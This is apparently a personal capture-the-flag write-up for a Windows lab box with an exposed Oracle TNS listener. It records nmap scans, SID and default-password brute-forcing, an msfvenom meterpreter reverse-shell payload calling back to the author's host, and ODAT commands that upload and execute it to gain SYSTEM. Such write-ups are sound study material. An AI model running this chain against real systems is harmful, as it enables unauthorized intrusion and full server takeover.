Windows | Medium
#oracle #metasploit

- Ran NMAP scan
```NMAP-SILO FOLD
# Nmap 7.93 scan initiated Wed Jan  3 22:32:52 2024 as: nmap -sCV -v -oA nmap_out 10.129.95.188
Nmap scan report for 10.129.95.188
Host is up (0.069s latency).
Not shown: 913 closed tcp ports (conn-refused), 75 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-03T22:34:55
|_  start_date: 2024-01-03T22:31:38
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   302: 
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan  3 22:35:02 2024 -- 1 IP address (1 host up) scanned in 129.50 second
```
- items of interest here are obviously the Oracle services
- the rpc and smb ports were somewhat interesting too, I prodded at those for a minute with smbclient and smbmap, but failed auth. No anonymous or guest auth allowed. 
- started msfconsole and searched oracle tns listener
```msfconsole_search FOLD
[msf](Jobs:0 Agents:0) >> search oracle tns listener

Matching Modules
================

   #  Name                                        Disclosure Date  Rank    Check  Description
   -  ----                                        ---------------  ----    -----  -----------
   0  exploit/windows/oracle/tns_auth_sesskey     2009-10-20       great   Yes    Oracle 10gR2 TNS Listener AUTH_SESSKEY Buffer Overflow
   1  exploit/windows/oracle/tns_arguments        2001-06-28       good    Yes    Oracle 8i TNS Listener (ARGUMENTS) Buffer Overflow
   2  exploit/windows/oracle/tns_service_name     2002-05-27       good    Yes    Oracle 8i TNS Listener SERVICE_NAME Buffer Overflow
   3  auxiliary/scanner/oracle/tnspoison_checker  2012-04-18       normal  No     Oracle TNS Listener Checker
   4  auxiliary/admin/oracle/tnscmd               2009-02-01       normal  No     Oracle TNS Listener Command Issuer
   5  auxiliary/admin/oracle/sid_brute            2009-01-07       normal  No     Oracle TNS Listener SID Brute Forcer
   6  auxiliary/scanner/oracle/sid_brute                           normal  No     Oracle TNS Listener SID Bruteforce
   7  auxiliary/scanner/oracle/sid_enum           2009-01-07       normal  No     Oracle TNS Listener SID Enumeration
   8  auxiliary/scanner/oracle/tnslsnr_version    2009-01-07       normal  No     Oracle TNS Listener Service Version Query

```
- I tried pretty much all of these just to see what I could get done. The sid_brute scanner returned some interesting results
```SID_BRUTE FOLD
[*] 10.129.95.188:1521    - Checking 572 SIDs against 10.129.95.188:1521
[+] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - 'XE' is valid
[+] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - 'PLSEXTPROC' is valid
[+] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - 'CLREXTPROC' is valid
[+] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - '' is valid
[*] 10.129.95.188:1521    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
- I also tried my luck with nmap oracle-brute script and got these results
```nmap_oracle-brute FOLD
[*] Nmap: |   Accounts:
[*] Nmap: |     ctxsys:change_on_install - Account is locked
[*] Nmap: |     dip:dip - Account is locked
[*] Nmap: |     system:oracle9 - Account is locked
[*] Nmap: |     xdb:change_on_install - Account is locked
[*] Nmap: |     dbsnmp:dbsnmp - Account is locked
[*] Nmap: |     hr:change_on_install - Account is locked
[*] Nmap: |     mdsys:mdsys - Account is locked
[*] Nmap: |     outln:outln - Account is locked
```
- I got stuck at this point and looked to walkthroughs. 
- Focusing on the XE account, we can use the open source tool, ODAT 
	- https://github.com/quentinhardy/odat
	- worth noting that I didn't want to go through the install of the dev version, even though that's recommend. Since it's just for this one off use, I will try the standalone.
- this tool can help you guess the SIDs as well (with sidguesser module), but I already got that
- Moved on to passwordguesser module
	- `./odat-libc2.17-x86_64 passwordguesser -s 10.129.37.47 -d XE`
- passwordguesser module comes back with a successful user/pass combo
	- scott/tiger
- with username/pass combo, we can use other modules in odat to upload and execute remote code: 
- Make payload with msfvenom
	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.130 LPORT=4444 -f exe > reverse.exe`
- Upload with odat utlfile module
	- `./odat-libc2.17-x86_64 utlfile -s 10.129.37.47 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ reverse.exe reverse.exe`
- execute file with externaltable module
	- `./odat-libc2.17-x86_64 externaltable -s 10.129.37.47 -p 1521 -U scott -P tiger -d XE --sysdba --getFile c:/ reverse.exe reverse.exe`
- This should've worked, but I'm getting an error: 
	- `ORA-29913: error in executing ODCIEXTTABLEFETCH callout ORA-30653: reject limit reached
- May be some kind of limit I hit by the brute forcing I've done or it could be something with the architecture of the payload (maybe use windows/x64?)
- came back to this after a couple days and re-read through the module options
	- noticed there is an --exec switch in the externaltable module. I used the following command to run the reverse.exe and establish a meterpreter shell! (side note: victim endpoint changed ips.)
	- `/odat-libc2.17-x86_64 externaltable -s 10.129.27.30 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ reverse.exe`
- That got me SYSTEM privs - gg

COMPLETE!